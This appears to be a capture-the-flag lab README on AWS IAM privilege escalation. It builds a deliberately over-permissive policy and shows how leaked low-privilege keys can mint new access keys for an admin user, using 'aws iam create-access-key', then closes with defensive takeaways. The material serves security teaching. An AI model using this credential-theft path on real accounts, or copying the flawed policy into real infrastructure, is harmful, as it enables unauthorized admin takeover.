# IAM Privilege Escalation CTF Lab: "The Rogue Developer's Backdoor"

## 🎯 Scenario
An internal audit discovered that a junior developer's IAM user (`dev-rookie`) might have been provisioned with an overly permissive policy that allows privilege escalation.

Your objective as the cloud security engineer is to **use the AWS CLI** to audit the policy, find the flaw, and prove how an attacker could escalate privileges to an admin-equivalent account.

## 🧪 Lab Setup
Run the provided setup script to create:
- Victim high-privilege user: `admin-service-account`
- Low-privilege attacker user: `dev-rookie`
- Vulnerable IAM policy: `CtfVulnerablePolicy` (attached to `dev-rookie`)

### Prerequisites
- AWS CLI v2 installed and configured with an **admin** IAM user (or root for setup only).
- `jq` installed (optional, for pretty JSON output).

### Setup
```bash
chmod +x setup.sh
./setup.sh
```
The script will output:
- Access keys for `dev-rookie` (save these – they represent leaked credentials)
- Confirmation of policy attachment

## 🔍 The Vulnerability
The policy `CtfVulnerablePolicy` contains two statements:

1. **BenignDeveloperAccess** – allows harmless S3 listing and IAM self-description.
2. **HiddenPrivEscalation** – allows:
   - `iam:CreateAccessKey`
   - `iam:TagUser`
   on the resource: `arn:aws:iam::<ACCOUNT_ID>:user/admin-service-account`

Because there is **no condition** restricting these actions, a principal with this policy can:
- Create a new access key for the `admin-service-account` user.
- Use that key to authenticate as an administrator.

This is a classic **credential theft** privilege escalation path.

## 💥 How to Exploit (Attacker Perspective)
Assuming you have obtained the `dev-rookie` access keys (e.g., via leaked credentials or SSRF):

1. Configure a local AWS profile for the attacker:
   ```bash
   aws configure --profile ctf-attacker
   # Enter the dev-rookie Access Key ID and Secret Access Key
   # Default region: us-east-1 (or your region)
   # Default output: json
   ```

2. From the attacker profile, create a fresh access key for the admin account:
   ```bash
   aws iam create-access-key --user-name admin-service-account --profile ctf-attacker
   ```

3. If successful, the command returns a new `AccessKeyId` and `SecretAccessKey` for `admin-service-account`. You now have persistent admin privileges!

4. (Optional) Verify by listing attached policies or listing IAM users with the stolen keys.

## 🧼 Cleanup
To remove all lab resources from your AWS account, run:
```bash
chmod +x cleanup.sh
./cleanup.sh
```
This detaches the policy, deletes both users, and removes the managed policy.

## 📚 Educational Takeaways
- Always enforce **least privilege**: scope `Resource` ARNs tightly.
- Use **Conditions** (e.g., `aws:Username`, MFA, IP) to restrict sensitive actions.
- Regularly audit IAM policies with the CLI simulator:
  ```bash
  aws iam simulate-custom-policy \
      --policy-input-list file://policy.json \
      --action-names iam:CreateAccessKey \
      --resource-arns arn:aws:iam::<ACCOUNT_ID>:user/admin-service-account
  ```
- Treat any policy that allows `iam:CreateAccessKey`, `iam:AttachUserPolicy`, or `iam:PutUserPolicy` on `Resource: *` (or broad wildcards) as critical.

---